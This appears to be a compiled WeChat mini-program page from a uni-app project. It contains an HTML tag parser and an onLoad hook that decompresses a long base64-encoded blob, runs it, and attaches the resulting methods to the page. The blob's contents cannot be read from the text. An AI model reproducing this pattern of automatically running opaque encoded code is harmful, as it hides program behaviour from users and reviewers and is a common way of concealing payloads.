"use strict";
var common_vendor = require("../../common/vendor.js");
const templateCom = () => "../../components/template.js";
const _sfc_main = {
  components: {
    templateCom
  },
  setup() {
    let html = common_vendor.ref("undefind");
    let { proxy } = common_vendor.getCurrentInstance();
    let _this = proxy;
    const tychange = (typeofData) => {
      return typeof typeofData === "object" ? JSON.stringify(typeofData) : typeofData;
    };
    const parseTag = (tag) => {
      let res = {
        type1: "tag",
        name: "",
        voidElement: false,
        children: []
      };
      let tagMatch = tag.match(/<\/?([^\s]+?)[/\s>]/);
      if (tagMatch) {
        res.type1 = tagMatch[1];
        if (tag.charAt(tag.length - 2) === "/") {
          res.voidElement = true;
        }
      }
      let classList = tag.match(/\s([^'"/\s><]+?)\s*?=\s*?(".*?"|'.*?')/g);
      if (classList) {
        let style = "";
        for (let i = 0; i < classList.length; i++) {
          let c = classList[i].split("=");
          c[0] = c[0].replace(/\s*/g, "");
          var lengthc = 2;
          for (lengthc; lengthc < c.length; lengthc++) {
            c[1] += "=" + c[lengthc];
          }
          let p = c[1].substring(1, c[1].length - 1);
          try {
            p = JSON.parse(c[1].substring(1, c[1].length - 1));
          } catch (e) {
          }
          if (c[1]) {
            if (c[0] === " style") {
              style = p + style;
              res[c[0]] = style;
            } else {
              res[c[0]] = p;
            }
          }
        }
      }
      return res;
    };
    const parse = (html2) => {
      var that = _this;
      let result = [];
      let current;
      let level = -1;
      let arr = [];
      let tagRE = /<[a-zA-Z\-\!\/](?:"[^"]*"['"]*|'[^']*'['"]*|[^'">])*>/g;
      html2.replace(tagRE, function(tag, index) {
        let isOpen = tag.charAt(1) !== "/";
        let start = index + tag.length;
        let text = html2.slice(start, html2.indexOf("<", start));
        let parent;
        if (isOpen) {
          level++;
          current = that.parseTag(tag);
          if (!current.voidElement && text.trim()) {
            current["text"] = text;
          }
          if (level === 0) {
            result.push(current);
          }
          parent = arr[level - 1];
          if (parent) {
            parent.children.push(current);
          }
          arr[level] = current;
        }
        if (!isOpen || current.voidElement) {
          level--;
        }
      });
      return result;
    };
    common_vendor.onLoad(() => {
      let { pakoRun } = proxy.$pakoRun;
      let args = {
        code: `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`
      };
      if (args) {
        try {
          let onLoad = pakoRun(args, args.code);
          let method = onLoad();
          for (const key in method) {
            _this[key] = method[key];
          }
          _this.onLoad();
        } catch (err) {
          console.log(err);
        }
      }
    });
    return { tychange, parseTag, parse, html };
  }
};
if (!Array) {
  const _component_templateCom = common_vendor.resolveComponent("templateCom");
  _component_templateCom();
}
function _sfc_render(_ctx, _cache, $props, $setup, $data, $options) {
  return {
    a: common_vendor.p({
      data: $setup.html
    })
  };
}
var MiniProgramPage = /* @__PURE__ */ common_vendor._export_sfc(_sfc_main, [["render", _sfc_render], ["__file", "/Users/yangchong/Desktop/dynamicUni_3/pages/index/index.vue"]]);
wx.createPage(MiniProgramPage);
